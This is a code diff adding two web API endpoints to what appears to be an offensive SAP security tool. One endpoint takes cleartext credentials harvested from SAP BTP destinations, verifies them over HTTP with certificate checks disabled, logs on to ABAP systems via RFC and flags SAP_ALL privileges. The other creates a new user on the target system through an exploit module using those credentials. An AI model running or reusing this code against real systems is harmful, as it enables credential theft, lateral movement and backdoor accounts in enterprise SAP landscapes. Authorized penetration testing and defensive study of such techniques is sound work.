@@ -6331,4 +6331,177 @@ def create_app(api: SAPMAPApi) -> Bottle:
             "prd_targets": prd_targets,
         })
 
+    @app.route("/api/btp/test_destination", method="POST")
+    def btp_test_destination():
+        """Test a BTP-sourced HTTP destination's captured credential.
+
+        Phase 1: HTTP basic-auth probe against the destination URL
+                 (proves the cleartext password is valid for the HTTP
+                 endpoint exposed via SCC tunnel).
+        Phase 2: when the target SID maps to an ABAP SAPNode, log on
+                 directly via RFC with the same creds and fetch
+                 profiles + roles + SAP_ALL flag.
+
+        Updates the underlying RFCConnection in place — the modal
+        live-poller in the GUI re-renders once tested flips True.
+        """
+        response.content_type = "application/json"
+        data = request.json or {}
+        source_sid = data.get("source_sid", "")
+        dest_name = data.get("destination_name", "")
+        if not source_sid.startswith("BTP:") or not dest_name:
+            return json.dumps({"error":
+                "source_sid (BTP:<uuid8>) and destination_name required"})
+        conn = next((c for c in api.state.connections
+                     if c.source_sid == source_sid
+                        and c.destination_name == dest_name), None)
+        if not conn:
+            return json.dumps({"error":
+                f"connection {source_sid} → {dest_name} not found"})
+
+        def _run():
+            import time as _t
+            import urllib.request, urllib.error, base64, ssl
+            conn.tested = False
+            conn.check_error = ""
+            conn.user_detail_error = ""
+            print(f"[*] BTP test: {source_sid} → {dest_name} "
+                  f"(URL={conn.http_url}, user={conn.rfc_user})")
+            # ---- Phase 1: HTTP basic-auth probe -----------------------
+            url = conn.http_url or ""
+            user = conn.rfc_user or ""
+            pwd = conn.secstore_password or ""
+            if not url or not user or not pwd:
+                conn.check_error = ("missing url / user / password — "
+                                     "destination did not capture cleartext")
+                conn.tested = True
+                print(f"[-] BTP test: {conn.check_error}")
+                return
+            t0 = _t.time()
+            try:
+                req = urllib.request.Request(url, method="GET")
+                tok = base64.b64encode(
+                    f"{user}:{pwd}".encode("utf-8")).decode("ascii")
+                req.add_header("Authorization", f"Basic {tok}")
+                req.add_header("User-Agent", "SAPMAP-BTP-probe/1.0")
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
+                    code = r.getcode()
+                    conn.latency_ms = int((_t.time() - t0) * 1000)
+                    conn.ping_ok = True
+                    conn.logon_successful = code < 400
+                    conn.logon_tested = True
+                    print(f"[+] BTP test: HTTP {code} from {url} "
+                          f"({conn.latency_ms}ms) — basic-auth OK")
+            except urllib.error.HTTPError as he:
+                conn.latency_ms = int((_t.time() - t0) * 1000)
+                conn.ping_ok = True   # the host answered, just rejected auth
+                conn.logon_successful = he.code < 400
+                conn.logon_tested = True
+                conn.check_error = f"HTTP {he.code}"
+                print(f"[-] BTP test: HTTP {he.code} from {url} "
+                      f"({conn.latency_ms}ms) — basic-auth "
+                      f"{'OK' if conn.logon_successful else 'rejected'}")
+            except Exception as e:
+                conn.check_error = str(e)[:200]
+                print(f"[-] BTP test: {url} unreachable — "
+                      f"{conn.check_error}")
+            conn.tested = True
+
+            # ---- Phase 2: direct RFC profile fetch on ABAP target -----
+            target = (api.state.get_node(conn.target_sid)
+                      if conn.target_sid else None)
+            target_is_abap = (target
+                              and "ABAP" in (target.system_type or "").upper())
+            platform = (conn.http_target_platform or "").upper()
+            if (conn.logon_successful and target_is_abap
+                    and (platform == "ABAP" or not platform)):
+                inst = (target.instances[0].instance_nr
+                        if target.instances else "00")
+                client = conn.client or "000"
+                rfc_creds = Credentials(
+                    username=user, password=pwd,
+                    client=client, instance_nr=inst,
+                )
+                try:
+                    if sapmap_rfc.test_connection(target, rfc_creds):
+                        print(f"[+] BTP test: RFC logon OK on "
+                              f"{conn.target_sid} ({user}/{client}) — "
+                              f"fetching profiles…")
+                        info = sapmap_rfc.get_direct_user_profiles(
+                            target, user, rfc_creds)
+                        conn.profiles = info.get("profiles", [])
+                        conn.roles = info.get("roles", [])
+                        conn.has_sap_all = info.get("has_sap_all", False)
+                        conn.user_detail_error = info.get("error", "")
+                        # Push verified creds onto the target so subsequent
+                        # propagation / Create-Remote-User reuses them.
+                        if not any(c.username == user and c.password == pwd
+                                   for c in target.credentials):
+                            target.credentials.append(rfc_creds)
+                        if conn.has_sap_all:
+                            print(f"[!] {user}@{conn.target_sid} carries "
+                                  f"SAP_ALL — Create Remote User now "
+                                  f"available")
+                            target.has_critical_finding = True
+                            api.state.notify_sap_all_if_elevated(conn)
+                    else:
+                        print(f"[-] BTP test: RFC logon failed on "
+                              f"{conn.target_sid} ({user}) — credential "
+                              f"works for HTTP but not RFC")
+                except Exception as e:
+                    conn.user_detail_error = str(e)[:200]
+                    print(f"[-] BTP test: RFC profile fetch failed — "
+                          f"{conn.user_detail_error}")
+
+        _bg(f"{source_sid}:btp_test:{dest_name}",
+            f"BTP test {dest_name}", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/btp/create_user_on_target", method="POST")
+    def btp_create_user_on_target():
+        """Create a SAPMAP user on the target ABAP system using a BTP
+        destination's captured credentials.  Wraps propagate_from_node
+        with a synthetic source SAPNode whose sid matches the
+        BTP:<uuid8> sentinel — propagate_from_node's fast path keys
+        on (source_sid, destination_name, target_sid) so the BTP
+        sentinel works identically to a real source SID."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        source_sid = data.get("source_sid", "")
+        dest_name = data.get("destination_name", "")
+        target_sid = data.get("target_sid", "")
+        if (not source_sid.startswith("BTP:")
+                or not dest_name or not target_sid):
+            return json.dumps({"error":
+                "source_sid (BTP:<uuid8>), destination_name and "
+                "target_sid required"})
+        conn = next((c for c in api.state.connections
+                     if c.source_sid == source_sid
+                        and c.destination_name == dest_name
+                        and c.target_sid == target_sid), None)
+        if not conn:
+            return json.dumps({"error":
+                f"connection {source_sid} → {dest_name} → "
+                f"{target_sid} not found"})
+        if not conn.logon_successful:
+            return json.dumps({"error":
+                "Run Test Connection first — propagation requires a "
+                "verified logon."})
+
+        # propagate_from_node only reads node.sid (for filtering) and
+        # node.saprouter (optional).  Build a thin stub with just those.
+        stub = SAPNode(sid=source_sid, hostname="", system_type="BTP")
+
+        def _run():
+            sapmap_exploit.propagate_from_node(
+                stub, api.state, target_sid=target_sid,
+                destination_name=dest_name)
+
+        _bg(f"{source_sid}:btp_create_user:{dest_name}",
+            f"BTP create user via {dest_name}", _run)
+        return json.dumps({"status": "started"})
+
     return app
